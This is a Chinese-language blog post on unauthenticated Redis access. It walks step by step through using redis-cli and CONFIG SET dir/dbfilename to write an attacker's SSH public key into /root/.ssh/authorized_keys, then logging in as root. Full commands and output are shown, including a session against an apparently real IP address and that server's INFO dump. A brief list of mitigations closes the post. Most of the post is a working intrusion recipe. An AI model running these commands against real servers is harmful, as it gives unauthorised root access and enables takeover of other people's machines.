---
title: 'Redis未授权访问'
layout: post
tags: 
  - Redis 
  - sec
  - hack
comments: true
share: true
category: sec
---
Redis未授权访问

<!--more-->

<strong>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将Redis服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据.这个漏洞主要针对Linux服务器,如果redis服务器使用root权限启动,并且没有配置认证,就可能导致redis数据丢失,服务器被添加用于ssh远程登录.可以通过公钥写入/root/.ssh目录,就可以免密码登陆</strong>

<strong>1.测试漏洞:</strong>

我们尝试登录redis服务器,查看之前数据库之前有没有被写入公钥.

如有的话,则可以查看一下,说不定能看到私钥:
<pre lang="python" line="1" escaped="true">root@kali:~/.ssh# redis-cli -h 目标ip
redis 目标IP:6379&gt; keys *
1) "pwn"
(1.07s)
redis 目标IP:6379&gt; get pwn
"\n\n\nssh-rsa                  AAAAB3NzaC1yc2EAAAADAQABAAABAQDCajTixIkl4vUUiYb2D7FYWPtey4+NqzaQnoED7nomh+QOtjMJXwNAUBQHIZDlJtB4Upmj++NCis04eZbv9qerHORO+I6Lghkm0FvDetfHCDm5oixyLQD1Qd2pi0dMe4AwHJTYbNRcayVdWHRpqOxpiW8xSMaobSnpq1mg6HWjojZFFBSdSa92dNHDQVcZUPJknD74dkzKRLWxgWxBqRoCAKpvTOIyfb4kZx5VR9VQfUK2qSEdFYyvAsJn22PoZ6FOaIHf9NY8kMNK6BqJygJt8x/kfOZflogaNJLd5g4K/LfQVe1eC75uKlqn4Gkjb4pqwpHs4Zd5a19siOPLTCX/ hei123\n\n\n\n"</pre>
<a href="http://b404-wordpress.stor.sinaapp.com/uploads/2015/11/11.jpg"><img class="alignnone size-medium wp-image-149" title="11" src="http://b404-wordpress.stor.sinaapp.com/uploads/2015/11/11-300x99.jpg" alt="" width="300" height="99" /></a>

若没有为空的话,则可以:

0x01 在本地生成ssh公钥和私钥:
<pre lang="c" line="1" escaped="true">root@kali:~# cd .ssh
root@kali:~/.ssh# ls
root@kali:~/.ssh# ssh-keygen -t rsa -C "hei123"
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
1a:ac:28:a8:c0:a2:f7:11:aa:c5:43:7b:0e:cc:82:54 hei123
The key's randomart image is:
+--[ RSA 2048]----+
|                 |
|                 |
|   E             |
|  .  .           |
| .. . o S        |
|== + o o         |
|B.@ + .          |
|==.= .           |
|+. .o            |
+-----------------+

root@kali:~/.ssh# ls
id_rsa  id_rsa.pub</pre>
<a href="http://b404-wordpress.stor.sinaapp.com/uploads/2015/11/1.jpg"><img class="alignnone size-medium wp-image-144" title="1" src="http://b404-wordpress.stor.sinaapp.com/uploads/2015/11/1-300x216.jpg" alt="" width="300" height="216" /></a>

0x02 将公钥写入文本中:
<pre lang="python" line="1" escaped="true">root@kali:~/.ssh# (echo -e "\n\n"; cat id_rsa.pub;echo -e "\n\n")&gt;foo.txt

root@kali:~/.ssh# ls
foo.txt  id_rsa  id_rsa.pub</pre>
<a href="http://b404-wordpress.stor.sinaapp.com/uploads/2015/11/5.jpg"><img class="alignnone size-medium wp-image-148" title="5" src="http://b404-wordpress.stor.sinaapp.com/uploads/2015/11/5-300x14.jpg" alt="" width="300" height="14" /></a>

0x03 把公钥文本写入redis服务器:
<pre lang="python" line="1" escaped="true">root@kali:~/.ssh# cat foo.txt | redis-cli -h 目标IP -x set pwn
OK</pre>
<a href="http://b404-wordpress.stor.sinaapp.com/uploads/2015/11/3.jpg"><img class="alignnone size-medium wp-image-146" title="3" src="http://b404-wordpress.stor.sinaapp.com/uploads/2015/11/3-300x34.jpg" alt="" width="300" height="34" /></a>

0x04 登入redis服务器,进入/root/.ssh目录写入公钥,并保存:
<pre lang="python" line="1" escaped="true">root@kali:~/.ssh# redis-cli -h 37.220.7.3
redis xxxxxxx:6379&gt; keys *
1) "pwn"
(0.51s)
redis xxxxxxxx:6379&gt; get dir
(nil)
redis xxxxxxxx:6379&gt; config get dir
1) "dir"
2) "/root/.ssh"
(1.81s)
redis xxxxxxxx:6379&gt; config set dbfilename ""authorized_keys
Invalid argument(s)
redis xxxxxxxx:6379&gt; config set dbfilename "authorized_keys"
OK
(0.80s)
redis xxxxxxxx:6379&gt; save
OK
redis xxxxxxxx:6379&gt; info
# Server
redis_version:2.8.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:e04f82ee9f1e3190
redis_mode:standalone
os:Linux 3.2.0-4-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
gcc_version:4.7.2
process_id:4224
run_id:fa3a75b01cc7bc57724c25ccad9da30562369ea7
tcp_port:6379
uptime_in_seconds:34244800
uptime_in_days:396
hz:10
lru_clock:48019
config_file:/usr/bin/redis/redis.conf

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:822080
used_memory_human:802.81K
used_memory_rss:2572288
used_memory_peak:10017760
used_memory_peak_human:9.55M
used_memory_lua:33792
mem_fragmentation_ratio:3.13
mem_allocator:jemalloc-3.2.0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1447515073
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:0
rdb_current_bgsave_time_sec:-1
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok

# Stats
total_connections_received:59511196
total_commands_processed:392815229
instantaneous_ops_per_sec:54
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
evicted_keys:0
keyspace_hits:16870259
keyspace_misses:297732059
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:220

# Replication
role:master
connected_slaves:0
master_repl_offset:0
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:15864.99
used_cpu_user:5654.41
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Keyspace
db0:keys=1,expires=0,avg_ttl=0
redis xxxxxxx:6379&gt;</pre>
<a href="http://b404-wordpress.stor.sinaapp.com/uploads/2015/11/1231234124.jpg"><img class="alignnone size-medium wp-image-159" title="1231234124" src="http://b404-wordpress.stor.sinaapp.com/uploads/2015/11/1231234124-300x187.jpg" alt="" width="300" height="187" /></a>

0x05 ssh连接目标机:
<pre lang="python" line="1" escaped="true">ssh root@目标IP</pre>
<a href="http://b404-wordpress.stor.sinaapp.com/uploads/2015/11/4.jpg"><img class="alignnone size-medium wp-image-147" title="4" src="http://b404-wordpress.stor.sinaapp.com/uploads/2015/11/4-300x62.jpg" alt="" width="300" height="62" /></a>

<strong>2.漏洞防范:</strong>
<ul>
	<li> 配置bind选项,限制可以连接redis的服务器IP;修改redis端口6379为其他的</li>
	<li>修改redis配置文件,将config命令重命名为其他</li>
	<li>控制权限</li>
	<li>配置AUTH, 设置密码, 密码会以明文方式保存在redis配置文件中</li>
	<li>启用认证</li>
</ul>
参考文档:<a href="https://www.sebug.net/vuldb/ssvid-89715">https://www.sebug.net/vuldb/ssvid-89715</a>